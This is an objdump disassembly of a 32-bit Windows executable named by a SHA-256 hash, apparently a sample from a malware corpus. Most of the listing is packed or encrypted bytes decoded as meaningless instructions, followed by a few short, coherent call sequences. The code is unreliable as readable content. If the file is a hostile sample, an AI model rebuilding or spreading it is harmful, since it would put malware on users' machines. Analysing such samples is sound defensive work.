
fb76a5112c926023504e81c923813b7a9516e71a1596aba7bd13c2e485888c8d.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	clc    
  4d0001:	fwait
  4d0002:	mov    esi,0x9051f6f0
  4d0007:	mov    esi,0x98953dab
  4d000c:	pop    edx
  4d000d:	arpl   bp,bx
  4d000f:	lods   al,BYTE PTR ds:[esi]
  4d0010:	or     DWORD PTR [eax+0x640c0bf1],edx
  4d0016:	enter  0x4511,0xf4
  4d001a:	(bad)  
  4d001b:	jle    0x4d0004
  4d001d:	aam    0xbb
  4d001f:	inc    edx
  4d0020:	sbb    eax,0xe19fa280
  4d0025:	add    esp,DWORD PTR [edx]
  4d0027:	push   ebp
  4d0028:	or     BYTE PTR [edx],cl
  4d002a:	fisubr WORD PTR [edx+0x665c75f9]
  4d0030:	icebp  
  4d0031:	out    dx,eax
  4d0032:	bswap  ebp
  4d0034:	inc    edx
  4d0035:	ds push esp
  4d0037:	lahf   
  4d0038:	sub    eax,edx
  4d003a:	add    esi,DWORD PTR [ecx+0x79c73e57]
  4d0040:	or     eax,DWORD PTR [edi+0x38]
  4d0043:	pop    ebp
  4d0044:	adc    DWORD PTR [ecx-0x10431a35],0x90456aac
  4d004e:	push   edi
  4d004f:	xchg   ebp,eax
  4d0050:	xor    bl,BYTE PTR [ebx+0x64d45d90]
  4d0056:	outs   dx,DWORD PTR ds:[esi]
  4d0057:	(bad)  
  4d0058:	mov    eax,0x49114a90
  4d005d:	outs   dx,DWORD PTR ds:[esi]
  4d005e:	mov    ch,0x9b
  4d0060:	mov    al,ds:0x61644d83
  4d0065:	add    eax,0xf08297f9
  4d006a:	jno    0x4d0037
  4d006c:	out    0x50,eax
  4d006e:	cli    
  4d006f:	mov    al,ds:0xc44e1789
  4d0074:	fstp   DWORD PTR [eax+0x6]
  4d0077:	(bad)  
  4d0078:	daa    
  4d0079:	std    
  4d007a:	add    edx,edi
  4d007c:	loopne 0x4d00ea
  4d007e:	(bad)  
  4d007f:	ins    DWORD PTR es:[edi],dx
  4d0080:	addr16 add eax,0x4302f767
  4d0086:	(bad)  
  4d0087:	imul   ebp,DWORD PTR [edi+0x11],0xf6e79555
  4d008e:	xor    esi,DWORD PTR [ecx+0x67908c1e]
  4d0094:	dec    ebp
  4d0095:	mov    ah,0xd7
  4d0097:	cwde   
  4d0098:	les    ecx,FWORD PTR [ebx+0x28]
  4d009b:	iret   
  4d009c:	loope  0x4d0058
  4d009e:	xlat   BYTE PTR ds:[ebx]
  4d009f:	xor    BYTE PTR [edx-0x78dad8bb],cl
  4d00a5:	inc    ebp
  4d00a6:	shl    eax,1
  4d00a8:	sbb    DWORD PTR [ebx-0x2dc7e0d2],edi
  4d00ae:	xchg   BYTE PTR [ecx+0x8792dc2],dh
  4d00b4:	jecxz  0x4d008e
  4d00b6:	xchg   bh,dh
  4d00b8:	adc    esp,ecx
  4d00ba:	cmp    al,0xf1
  4d00bc:	jns    0x4d00f7
  4d00be:	ret    
  4d00bf:	push   cs
  4d00c0:	in     eax,0x24
  4d00c2:	les    esp,FWORD PTR ds:0xd4243140
  4d00c8:	(bad)
  4d00cb:	adc    esi,DWORD PTR [ebx+0x36]
  4d00ce:	and    al,0xec
  4d00d0:	sbb    edx,eax
  4d00d2:	inc    esi
  4d00d3:	adc    al,0x52
  4d00d5:	ds mov eax,0x47191361
  4d00db:	hlt    
  4d00dc:	push   ss
  4d00dd:	jb     0x4d00e5
  4d00df:	je     0x4d0136
  4d00e1:	mov    cs,WORD PTR [ebp-0x1c]
  4d00e4:	stos   DWORD PTR es:[edi],eax
  4d00e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d00e6:	(bad)  
  4d00e7:	imul   esp,DWORD PTR [edi-0x506c7f51],0x7c
  4d00ee:	xlat   BYTE PTR ds:[ebx]
  4d00ef:	ret    
  4d00f0:	push   ecx
  4d00f1:	fld    DWORD PTR [eax+0x24]
  4d00f4:	fldcw  WORD PTR [ecx]
  4d00f6:	mov    edi,0x7d1cb3db
  4d00fb:	mov    cl,0x52
  4d00fd:	jmp    0x2d3c46ea
  4d0102:	pop    ss
  4d0103:	fiadd  DWORD PTR [edi-0x5181de17]
  4d0109:	mov    ch,bh
  4d010b:	or     al,0xab
  4d010d:	test   eax,0x56bef77a
  4d0112:	mov    ch,0x8
  4d0114:	inc    ebx
  4d0115:	test   al,0xbb
  4d0117:	inc    edi
  4d0118:	adc    DWORD PTR [edi-0x66],edx
  4d011b:	enter  0x267b,0xd2
  4d011f:	xchg   edx,ebx
  4d0121:	inc    ebx
  4d0122:	xor    cl,bh
  4d0124:	jp     0x4d00e1
  4d0126:	and    edi,DWORD PTR ds:0x19deaedb
  4d012c:	jns    0x4d00d5
  4d012e:	lods   al,BYTE PTR ds:[esi]
  4d012f:	mov    ch,0x13
  4d0131:	push   esp
  4d0132:	inc    edi
  4d0133:	out    dx,eax
  4d0134:	dec    esp
  4d0135:	stos   DWORD PTR es:[edi],eax
  4d0136:	push   cs
  4d0137:	sbb    eax,0xe6bfe00d
  4d013c:	cmp    eax,0xdc92cd5c
  4d0141:	mov    cl,BYTE PTR cs:[ebp-0x794877cc]
  4d0148:	shr    BYTE PTR [edi+0x58],1
  4d014b:	xor    BYTE PTR [edx-0x6a],bh
  4d014e:	pop    es
  4d014f:	pop    ebx
  4d0150:	into   
  4d0151:	jge    0x4d01d0
  4d0153:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4d0155:	ret    
  4d0156:	or     eax,0xb2c162e2
  4d015b:	xchg   edx,eax
  4d015c:	fldenv [esi]
  4d015e:	fbstp  TBYTE PTR [ecx+0x28]
  4d0161:	fldcw  WORD PTR [ebx+0x786e6456]
  4d0167:	xchg   ecx,eax
  4d0168:	adc    dl,BYTE PTR [edi+eax*4-0x731d0d92]
  4d016f:	nop
  4d0170:	xchg   BYTE PTR ds:0xd587eefe,ch
  4d0176:	cld    
  4d0177:	ins    BYTE PTR es:[edi],dx
  4d0178:	retf   0xd7b5
  4d017b:	in     eax,0x87
  4d017d:	fwait
  4d017e:	jg     0x4d01eb
  4d0180:	int3   
  4d0181:	into   
  4d0182:	test   ch,ah
  4d0184:	mov    WORD PTR [eax],?
  4d0186:	shl    DWORD PTR [esi],1
  4d0188:	into   
  4d0189:	add    ch,bh
  4d018b:	xor    BYTE PTR [esi],ah
  4d018d:	test   al,0x70
  4d018f:	pop    edx
  4d0190:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0191:	dec    ebx
  4d0192:	xor    al,0xa5
  4d0194:	mov    al,0xc0
  4d0196:	and    edi,DWORD PTR [esp+edx*8-0x21d9fafa]
  4d019d:	loope  0x4d01a5
  4d019f:	(bad)  [ebx]
  4d01a1:	push   ds
  4d01a2:	loope  0x4d014a
  4d01a4:	fsubrp st(1),st
  4d01a6:	push   ds
  4d01a7:	mov    cl,0x8b
  4d01a9:	push   ds
  4d01aa:	and    DWORD PTR [edi+0x76],ecx
  4d01ad:	loopne 0x4d0203
  4d01af:	sbb    ecx,esp
  4d01b1:	stos   BYTE PTR es:[edi],al
  4d01b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d01b3:	jb     0x4d01c5
  4d01b5:	ds fs xchg ecx,eax
  4d01b8:	icebp  
  4d01b9:	sar    edi,0x6d
  4d01bc:	inc    ebp
  4d01bd:	outs   dx,BYTE PTR ds:[esi]
  4d01be:	add    BYTE PTR [edx-0x51751644],dl
  4d01c4:	push   ecx
  4d01c5:	mov    eax,ds:0xb6e95db5
  4d01ca:	bound  edx,QWORD PTR [esi]
  4d01cc:	sbb    al,0xd4
  4d01ce:	popf   
  4d01cf:	aam    0xdc
  4d01d1:	mov    bh,0x6e
  4d01d3:	dec    edi
  4d01d4:	sub    BYTE PTR [ecx-0x68b5c433],dl
  4d01da:	xor    eax,0xe2e140bb
  4d01df:	int    0x31
  4d01e1:	cmp    eax,DWORD PTR [ebx+0x7cdb1129]
  4d01e7:	mul    BYTE PTR [ebp+0x31]
  4d01ea:	out    0xaa,eax
  4d01ec:	mov    ah,0xce
  4d01ee:	sbb    BYTE PTR [ebp-0x28],dl
  4d01f1:	jno    0x4d020a
  4d01f3:	xor    al,0xa1
  4d01f5:	xchg   esi,eax
  4d01f6:	out    0x21,eax
  4d01f8:	je     0x4d024b
  4d01fa:	(bad)  
  4d01fb:	loopne 0x4d018a
  4d01fd:	scas   al,BYTE PTR es:[edi]
  4d01fe:	int    0xe8
  4d0200:	int3   
  4d0201:	fisub  DWORD PTR [esi-0x5679aec5]
  4d0207:	lods   al,BYTE PTR ds:[esi]
  4d0208:	in     eax,dx
  4d0209:	jge    0x4d0261
  4d020b:	push   ebx
  4d020c:	ins    BYTE PTR es:[edi],dx
  4d020d:	add    esp,DWORD PTR [edx]
  4d020f:	add    eax,0xfaddfe95
  4d0214:	loope  0x4d0226
  4d0216:	lods   eax,DWORD PTR ds:[esi]
  4d0217:	or     DWORD PTR [esi+esi*4+0x57],eax
  4d021b:	sbb    bh,BYTE PTR [ebp+0x43e5a849]
  4d0221:	sub    edi,DWORD PTR [esi+ebx*1+0xe]
  4d0225:	or     BYTE PTR [ebp+eiz*4+0x53],al
  4d0229:	sub    DWORD PTR [edi-0x2446dba2],0x57
  4d0230:	pop    ebp
  4d0231:	inc    edi
  4d0232:	and    al,0xa8
  4d0234:	sub    DWORD PTR [edi+0x43dbcb50],ebp
  4d023a:	cmp    esi,DWORD PTR [ebx-0x3e3bbece]
  4d0240:	cmp    edx,eax
  4d0242:	ss xchg esi,eax
  4d0244:	(bad)  
  4d0245:	xchg   ebx,eax
  4d0246:	int    0xee
  4d0248:	cli    
  4d0249:	loope  0x4d0281
  4d024b:	push   0xe7c97406
  4d0250:	push   ecx
  4d0251:	pop    ss
  4d0252:	lods   eax,DWORD PTR ds:[esi]
  4d0253:	sub    BYTE PTR [ebx-0x42a2125],dh
  4d0259:	test   eax,0x82019fe1
  4d025e:	adc    eax,0x3bdcceec
  4d0263:	xchg   DWORD PTR fs:[ebp+0x71d1ecc8],ecx
  4d026a:	lea    ebx,[edi]
  4d026c:	xchg   BYTE PTR [ecx],bl
  4d026e:	jns    0x4d02d5
  4d0270:	cmp    esi,DWORD PTR [edi+0x17]
  4d0273:	es or  al,0x99
  4d0276:	jne    0x4d0286
  4d0278:	clc    
  4d0279:	mov    ebp,0xb6c97737
  4d027e:	jecxz  0x4d02b1
  4d0280:	cmp    BYTE PTR [ecx+0x1c],cl
  4d0283:	dec    esi
  4d0284:	ds mov ebx,0x46c6f670
  4d028a:	mov    ah,0x8
  4d028c:	cmp    bh,BYTE PTR [ecx-0x4439b835]
  4d0292:	pop    eax
  4d0293:	int3   
  4d0294:	cmp    bl,BYTE PTR [edx+0x46b2deaf]
  4d029a:	mov    al,0x7f
  4d029c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d029d:	adc    ah,BYTE PTR [eax+edx*8-0x7aa4bb55]
  4d02a4:	bound  edx,QWORD PTR [ebx]
  4d02a6:	sub    BYTE PTR [ecx-0x4d],al
  4d02a9:	xlat   BYTE PTR ds:[ebx]
  4d02aa:	and    BYTE PTR [bx+di],dl
  4d02ad:	mov    DWORD PTR [ebx],esp
  4d02af:	mov    bl,0x7b
  4d02b1:	imul   esp,eax,0x75c1c2c2
  4d02b7:	jno    0x4d027d
  4d02b9:	adc    BYTE PTR [edx+0x65efd212],bl
  4d02bf:	in     eax,dx
  4d02c0:	mov    edx,0x47133e9e
  4d02c5:	popa   
  4d02c6:	dec    esp
  4d02c7:	mov    ds:0x5cb39f5a,eax
  4d02cc:	sub    al,0x57
  4d02ce:	pop    esp
  4d02cf:	daa    
  4d02d0:	push   esi
  4d02d1:	test   eax,0x49aed8a3
  4d02d6:	or     dh,BYTE PTR [ebx-0x620f45b5]
  4d02dc:	inc    ecx
  4d02dd:	or     ah,BYTE PTR [eax-0x4d]
  4d02e0:	adc    al,BYTE PTR [esi+0xa]
  4d02e3:	push   ecx
  4d02e4:	push   edi
  4d02e5:	mov    edx,0x9caaaf05
  4d02ea:	jge    0x4d0325
  4d02ec:	pop    ebx
  4d02ed:	mov    bl,0xec
  4d02ef:	retf   0x4d0e
  4d02f2:	and    esi,DWORD PTR ds:0xcf5e09f3
  4d02f8:	xor    dh,dh
  4d02fa:	mov    cl,0x30
  4d02fc:	iret   
  4d02fd:	or     BYTE PTR [ebx+ebx*8+0x7e684d31],ah
  4d0304:	sub    DWORD PTR [eax-0x3d],esp
  4d0307:	dec    ecx
  4d0308:	sub    DWORD PTR [ebx],ebp
  4d030a:	add    eax,0xe458c188
  4d030f:	jl     0x4d0384
  4d0311:	xor    BYTE PTR [bx+si],0xf4
  4d0315:	inc    ecx
  4d0316:	jle    0x4d0317
  4d0318:	add    esi,0x398fffa6
  4d031e:	pop    ecx
  4d031f:	add    DWORD PTR [esi-0x2b127733],eax
  4d0325:	mov    edi,0x913136bb
  4d032a:	xchg   esi,eax
  4d032b:	sbb    edi,ecx
  4d032d:	lahf   
  4d032e:	shl    esi,1
  4d0330:	inc    edx
  4d0331:	pusha  
  4d0332:	cs jo  0x4d0377
  4d0335:	mov    dh,dl
  4d0337:	fistp  QWORD PTR [esi+0x532091a8]
  4d033d:	push   edi
  4d033e:	outs   dx,BYTE PTR ds:[esi]
  4d033f:	ss das 
  4d0341:	lods   eax,DWORD PTR ds:[esi]
  4d0342:	mov    ch,0xc9
  4d0344:	loop   0x4d0398
  4d0346:	dec    edx
  4d0347:	xor    eax,0x20b4b974
  4d034c:	cdq    
  4d034d:	mov    al,ds:0xe4c037a4
  4d0352:	and    al,0x3e
  4d0354:	ret    0x9e7c
  4d0357:	and    ch,BYTE PTR [edx]
  4d0359:	mov    ecx,DWORD PTR [esi]
  4d035b:	rcl    ah,0x2
  4d035e:	es inc ebx
  4d0360:	lock mov dl,al
  4d0363:	dec    eax
  4d0364:	add    al,0x31
  4d0366:	dec    esi
  4d0367:	mov    bh,0xfd
  4d0369:	into   
  4d036a:	cdq    
  4d036b:	xor    al,0x3
  4d036d:	xor    DWORD PTR [esi-0x7b],esp
  4d0370:	sbb    eax,0xcc7a99cf
  4d0375:	adc    ah,BYTE PTR [esi-0x7b]
  4d0378:	xor    al,0x44
  4d037a:	push   ebx
  4d037b:	or     ch,0xbb
  4d037e:	lods   al,BYTE PTR ds:[esi]
  4d037f:	or     al,BYTE PTR gs:[ebx+edx*2-0x66]
  4d0384:	or     BYTE PTR [eax+edi*1-0x2ed35c66],0x65
  4d038c:	pop    esi
  4d038d:	rcl    DWORD PTR [esi],cl
  4d038f:	bound  esp,QWORD PTR [edx+0x5d29e92c]
  4d0395:	pop    edi
  4d0396:	loope  0x4d0356
  4d0398:	bound  esp,QWORD PTR [eax+0x1fd2411e]
  4d039e:	xor    al,BYTE PTR [eax-0x7b711809]
  4d03a4:	cs and eax,0x86f77f72
  4d03aa:	adc    al,BYTE PTR [ecx+0x7f]
  4d03ad:	push   0x46
  4d03af:	dec    edx
  4d03b0:	jns    0x4d0383
  4d03b2:	jle    0x4d03de
  4d03b4:	mov    edi,DWORD PTR [eax-0xa]
  4d03b7:	mov    dl,0x1
  4d03b9:	mov    esp,0x440a062d
  4d03be:	sar    cl,cl
  4d03c0:	fist   WORD PTR [ecx+0x2d]
  4d03c3:	push   es
  4d03c4:	and    DWORD PTR [esi-0x5fc9f977],edi
  4d03ca:	(bad)  
  4d03cb:	mov    dl,0xd3
  4d03cd:	pop    edi
  4d03ce:	cmp    BYTE PTR [ebp+0x16],cl
  4d03d1:	es (bad) 
  4d03d3:	mov    dl,0xea
  4d03d5:	xor    esp,DWORD PTR [ecx]
  4d03d7:	int    0x16
  4d03d9:	int3   
  4d03da:	fidivr WORD PTR [edi+ebx*2+0x65a43d58]
  4d03e1:	stc    
  4d03e2:	add    DWORD PTR [ecx+edi*4-0x41],0xffffff9c
  4d03e7:	mov    ebx,0xb8ab4048
  4d03ec:	jmp    0x18945b69
  4d03f1:	xchg   eax,esi
  4d03f3:	sub    al,0x11
  4d03f5:	xor    dh,BYTE PTR [eax]
  4d03f7:	shl    eax,cl
  4d03f9:	int    0x17
  4d03fb:	mov    eax,ds:0x5eeceb31
  4d0400:	rcl    BYTE PTR [ebx+ebx*2],1
  4d0403:	adc    eax,0xeae5a449
  4d0408:	mov    eax,0x5989625b
  4d040d:	pop    ebp
  4d040e:	mov    ds:0xa5a2a876,al
  4d0413:	std    
  4d0414:	popa   
  4d0415:	push   ss
  4d0416:	fwait
  4d0417:	add    ah,BYTE PTR [eax+0x6171ace9]
  4d041d:	mov    eax,ds:0xbf63e814
  4d0422:	jbe    0x4d0491
  4d0424:	push   cs
  4d0425:	ret    0x247b
  4d0428:	fld    QWORD PTR [ebx-0x1b8e9904]
  4d042e:	mov    ss,WORD PTR [edi+0x68c99913]
  4d0434:	bound  ebp,QWORD PTR [edx+0x37]
  4d0437:	or     al,0xf7
  4d0439:	and    BYTE PTR [esi],cl
  4d043b:	push   esp
  4d043c:	(bad)  
  4d043d:	lahf   
  4d043e:	sar    bx,0xa6
  4d0442:	aad    0x90
  4d0444:	rcr    BYTE PTR [ebp+0x2a],0x6f
  4d0448:	inc    ecx
  4d0449:	mov    bh,BYTE PTR [ebx-0x6e]
  4d044c:	shl    BYTE PTR [ebp-0x22],0x70
  4d0450:	xor    DWORD PTR [esi-0x526744e7],ecx
  4d0456:	pop    ebx
  4d0457:	popf   
  4d0458:	ficomp WORD PTR [edi-0x59]
  4d045b:	xlat   BYTE PTR ds:[ebx]
  4d045c:	jg     0x4d0401
  4d045e:	aad    0x84
  4d0460:	lods   eax,DWORD PTR ds:[esi]
  4d0461:	test   eax,0xcb1d0086
  4d0466:	test   BYTE PTR [esp+esi*1+0x78ae3d68],ch
  4d046d:	sbb    ebp,DWORD PTR [ebp+edx*2+0x6db5c86b]
  4d0474:	idiv   BYTE PTR [edx-0x46f42139]
  4d047a:	dec    edx
  4d047b:	or     DWORD PTR ds:0x87f6b547,eax
  4d0481:	ss lahf 
  4d0483:	mov    ?,WORD PTR [ecx+0x3e]
  4d0486:	addr16 sbb al,0x70
  4d0489:	gs cdq 
  4d048b:	jecxz  0x4d041e
  4d048d:	sti    
  4d048e:	sub    DWORD PTR [ebp+0x6f],edi
  4d0491:	pop    edx
  4d0492:	adc    cl,BYTE PTR [esi]
  4d0494:	push   0x31
  4d0496:	arpl   WORD PTR [esi],di
  4d0498:	and    dl,BYTE PTR [ebp*8+0x13542f11]
  4d049f:	out    dx,al
  4d04a0:	fisubr WORD PTR [ebx-0x6b87eec1]
  4d04a6:	sbb    DWORD PTR [edi],edi
  4d04a8:	adc    al,0x64
  4d04aa:	fisub  DWORD PTR [ebp-0x2b]
  4d04ad:	aam    0x25
  4d04af:	call   0xacf9:0xaa63732c
  4d04b6:	daa    
  4d04b7:	dec    esi
  4d04b8:	xchg   ebp,eax
  4d04b9:	pop    edi
  4d04ba:	xchg   ebp,eax
  4d04bb:	mov    dh,0x6c
  4d04bd:	mov    al,ds:0x7836ad6a
  4d04c2:	xchg   ebp,eax
  4d04c3:	push   edx
  4d04c4:	retf   
  4d04c5:	adc    bl,bl
  4d04c7:	fld    DWORD PTR [edi-0x79d9daab]
  4d04cd:	stos   BYTE PTR es:[edi],al
  4d04ce:	sub    eax,0x5f95d0d9
  4d04d3:	xor    ebp,ecx
  4d04d5:	stc    
  4d04d6:	mov    eax,ds:0xe9d5a31c
  4d04db:	fist   DWORD PTR [ecx-0x30]
  4d04de:	jp     0x4d04a5
  4d04e0:	enter  0x852f,0x3a
  4d04e4:	enter  0xa710,0x26
  4d04e8:	cld    
  4d04e9:	dec    edi
  4d04ea:	fcmovb st,st(5)
  4d04ec:	and    eax,0x443a25b2
  4d04f1:	jb     0x4d04cf
  4d04f3:	lds    edi,FWORD PTR [ebp+0x44a519c0]
  4d04f9:	test   eax,0x731259ee
  4d04fe:	pushf  
  4d04ff:	jle    0x4d0544
  4d0501:	loopne 0x4d0565
  4d0503:	xlat   BYTE PTR ds:[ebx]
  4d0504:	repnz stos BYTE PTR es:[edi],al
  4d0506:	loope  0x4d0554
  4d0508:	sub    ebx,DWORD PTR [eax+0x5e]
  4d050b:	out    dx,eax
  4d050c:	popa   
  4d050d:	sub    BYTE PTR [edx+0x11],ah
  4d0510:	mov    al,ds:0xd5af22d7
  4d0515:	sub    DWORD PTR [ebx],esp
  4d0517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0518:	jg     0x4d04ef
  4d051a:	xor    dl,BYTE PTR [ebx+0x5242eb07]
  4d0520:	dec    ebp
  4d0521:	adc    al,0x13
  4d0523:	(bad)  
  4d0524:	xor    eax,0xcc3c11b0
  4d0529:	dec    edi
  4d052a:	ja     0x4d0564
  4d052c:	pop    ecx
  4d052d:	int3   
  4d052e:	jmp    0x82e90dbd
  4d0533:	loope  0x4d052e
  4d0535:	arpl   bp,sp
  4d0537:	nop
  4d0538:	jl     0x4d0504
  4d053a:	jle    0x4d0513
  4d053c:	repnz test al,0xf7
  4d053f:	mov    esp,DWORD PTR [ebx+0x56]
  4d0542:	pop    esi
  4d0543:	js     0x4d0568
  4d0545:	push   0x17
  4d0547:	nop
  4d0548:	xor    dl,BYTE PTR [ebp+0x2b54703e]
  4d054e:	fst    QWORD PTR ss:[edi]
  4d0551:	aad    0x31
  4d0553:	mov    WORD PTR [eax-0x61],ds
  4d0556:	xor    al,0xdc
  4d0558:	psubusb mm7,QWORD PTR [ebx]
  4d055b:	xchg   esi,eax
  4d055c:	inc    esi
  4d055d:	js     0x4d0522
  4d055f:	mov    edi,0x4d010ac3
  4d0564:	leave  
  4d0565:	in     eax,0x4f
  4d0567:	pop    es
  4d0568:	mov    ds:0xb5001a5a,al
  4d056d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d056e:	cmp    ecx,DWORD PTR [esp+eiz*4]
  4d0571:	stos   DWORD PTR es:[edi],eax
  4d0572:	sbb    BYTE PTR [edi+eax*8+0x5b],al
  4d0576:	cmp    eax,0xc2a460a4
  4d057b:	pop    ebx
  4d057c:	sub    al,0x98
  4d057e:	popa   
  4d057f:	and    eax,0xda9e7a9c
  4d0584:	gs out dx,eax
  4d0586:	push   0xdeb58f7e
  4d058b:	or     al,0x38
  4d058d:	imul   BYTE PTR [esi-0x46453d8f]
  4d0593:	cmp    BYTE PTR [edi+0x148af6f0],dl
  4d0599:	maxps  xmm0,XMMWORD PTR [ecx-0x749a8bbb]
  4d05a0:	sbb    eax,0xb473f34f
  4d05a5:	push   es
  4d05a6:	cmc    
  4d05a7:	sub    cl,BYTE PTR [ebp-0x7]
  4d05aa:	or     dh,BYTE PTR [edx]
  4d05ac:	inc    ecx
  4d05ad:	dec    esp
  4d05ae:	gs push ecx
  4d05b0:	cmp    BYTE PTR [eax+0x57a5f323],0x39
  4d05b7:	or     eax,0xf2c6a85c
  4d05bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d05bd:	push   edi
  4d05be:	mov    eax,ds:0x5ea85c0d
  4d05c3:	mov    ch,0xb
  4d05c5:	mov    edx,DWORD PTR [edi-0x3d3d4f4f]
  4d05cb:	mov    ah,0xfe
  4d05cd:	mov    ds:0x64771b70,eax
  4d05d2:	adc    bl,dl
  4d05d4:	mov    WORD PTR [ebx+0x42602cef],gs
  4d05da:	sahf   
  4d05db:	xor    DWORD PTR [edi+0x53446142],ebx
  4d05e1:	dec    ecx
  4d05e2:	adc    eax,0x3b7114f6
  4d05e7:	dec    edi
  4d05e8:	jp     0x4d05ad
  4d05ea:	loop   0x4d0602
  4d05ec:	xor    al,0xa3
  4d05ee:	push   eax
  4d05ef:	mov    ecx,0x98733d42
  4d05f4:	repnz mov ecx,esi
  4d05f7:	xchg   edx,eax
  4d05f8:	shr    esp,1
  4d05fa:	xor    eax,0xc1fe32e1
  4d05ff:	push   edx
  4d0600:	pop    DWORD PTR ds:0x546e9000
  4d0606:	ret    
  4d0607:	sti    
  4d0608:	adc    BYTE PTR [edi+eiz*4],dl
  4d060b:	or     BYTE PTR [ecx-0x14],bl
  4d060e:	push   0x16aa8f7
  4d0613:	or     DWORD PTR [eax-0x15],ebx
  4d0616:	push   cs
  4d0617:	sbb    BYTE PTR [ecx+0x6982dd96],0x69
  4d061e:	and    cl,BYTE PTR [eax]
  4d0620:	xchg   esp,eax
  4d0621:	jmp    ecx
  4d0623:	clc    
  4d0624:	ins    DWORD PTR es:[edi],dx
  4d0625:	add    BYTE PTR [ebp+0x5a],dh
  4d0628:	xchg   ebx,eax
  4d0629:	push   ebp
  4d062a:	stos   DWORD PTR es:[edi],eax
  4d062b:	movd   mm2,DWORD PTR [edx]
  4d062e:	aad    0xf0
  4d0630:	xchg   ebx,eax
  4d0631:	in     eax,dx
  4d0632:	xchg   esp,eax
  4d0633:	adc    bl,al
  4d0635:	adc    dl,ch
  4d0637:	out    dx,al
  4d0638:	xchg   ecx,eax
  4d0639:	in     eax,dx
  4d063a:	sub    dl,BYTE PTR [ecx]
  4d063c:	lock imul edx,esp,0xf0173544
  4d0643:	mov    edi,0x30fe8cd
  4d0648:	les    ebp,FWORD PTR [edi-0x11]
  4d064b:	int    0x38
  4d064d:	gs mov bl,0x93
  4d0650:	push   ebx
  4d0651:	xlat   BYTE PTR ds:[ebx]
  4d0652:	push   eax
  4d0653:	mov    ecx,0x135ee0fb
  4d0658:	jecxz  0x4d06b4
  4d065a:	cmp    dh,BYTE PTR [ebx+0x3e]
  4d065d:	xor    DWORD PTR [esi],ecx
  4d065f:	out    dx,eax
  4d0660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0661:	inc    ecx
  4d0662:	retf   
  4d0663:	sub    al,0x3d
  4d0665:	jnp    0x4d067a
  4d0667:	inc    eax
  4d0668:	pop    edi
  4d0669:	xor    ecx,DWORD PTR [ecx-0x400f9d6c]
  4d066f:	pop    es
  4d0670:	ja     0x4d06ef
  4d0672:	in     eax,dx
  4d0673:	js     0xbfc2c3c5
  4d0679:	pop    ds
  4d067a:	fnsave [ebx-0xcd19cb6]
  4d0680:	jo     0x4d0605
  4d0682:	call   0x18e5d794
  4d0687:	jge    0x4d0674
  4d0689:	scas   eax,DWORD PTR es:[edi]
  4d068a:	leave  
  4d068b:	dec    edx
  4d068c:	mov    ds:0x60db930f,eax
  4d0691:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d0699:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06a1:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06a9:	sub    DWORD PTR [ebx+ebx*8+0x24537ca1],0x60
  4d06b1:	in     al,0xac
  4d06b3:	(bad)  [ecx+0x60245873]
  4d06b9:	nop
  4d06ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d06bb:	(bad)  [ebp-0x72]
  4d06be:	fisubr DWORD PTR [edx]
  4d06c0:	inc    esp
  4d06c1:	sbb    BYTE PTR [edx+0x61b57c69],bl
  4d06c7:	mov    dh,0x11
  4d06c9:	pop    esi
  4d06ca:	xchg   esi,eax
  4d06cb:	pop    esp
  4d06cc:	xlat   BYTE PTR ds:[ebx]
  4d06cd:	ds les eax,FWORD PTR es:[edi+0x701c86ef]
  4d06d5:	fs (bad) 
  4d06d7:	cmp    bh,BYTE PTR [esi+eax*1-0x72]
  4d06db:	ret    
  4d06dc:	inc    bx
  4d06de:	push   ebp
  4d06df:	scas   eax,DWORD PTR es:[edi]
  4d06e0:	mov    cl,0xaa
  4d06e2:	test   edi,ebp
  4d06e4:	sub    DWORD PTR [ecx+0x45b033f1],0x4e
  4d06eb:	lods   eax,DWORD PTR ds:[esi]
  4d06ec:	pop    edi
  4d06ed:	call   DWORD PTR ds:0x4d203c
  4d06f3:	call   edi
  4d06f5:	add    BYTE PTR [eax],al
  4d06f7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d06fd:	sub    esp,0x58
  4d0700:	lea    ecx,[eax+0x70]
  4d0703:	mov    DWORD PTR [ebp-0x38],0x7b5a
  4d070a:	push   ecx
  4d070b:	call   0x4d1430
  4d0710:	add    esp,0x4
  4d0713:	pop    ecx
  4d0714:	push   ecx
  4d0715:	push   edx
  4d0716:	push   ebx
  4d0717:	push   DWORD PTR [ecx+0x154]
  4d071d:	call   0x4d11f0
  4d0722:	add    esp,0xc
  4d0725:	pop    ecx
  4d0726:	push   ecx
  4d0727:	mov    esi,0x0
  4d072c:	push   esi
  4d072d:	call   0x4d0e38
  4d0732:	add    esp,0x4
  4d0735:	pop    ecx
  4d0736:	add    esp,0x58
  4d0739:	pop    ebp
  4d073a:	ret    
  4d073b:	add    BYTE PTR [edi-0x1],bl
  4d073e:	adc    eax,0x4d2074
  4d0743:	call   edi
  4d0745:	add    BYTE PTR [eax],al
  4d0747:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d074d:	sub    esp,0x58
  4d0750:	lea    eax,ds:0x4d3080
  4d0756:	xor    DWORD PTR [eax+0x13c],0x6
  4d075d:	push   eax
  4d075e:	call   0x4d0c94
  4d0763:	add    esp,0x4
  4d0766:	pop    eax
  4d0767:	push   eax
  4d0768:	push   DWORD PTR [eax+0x18c]
  4d076e:	push   DWORD PTR [eax+0x70]
  4d0771:	call   0x4d0920
  4d0776:	add    esp,0x8
  4d0779:	pop    eax
  4d077a:	push   eax
  4d077b:	call   0x4d1430
  4d0780:	add    esp,0x4
  4d0783:	pop    eax
  4d0784:	add    esp,0x58
  4d0787:	pop    ebp
  4d0788:	ret    
  4d0789:	add    BYTE PTR [eax],al
  4d078b:	add    BYTE PTR [ebx-0x1374aa01],cl
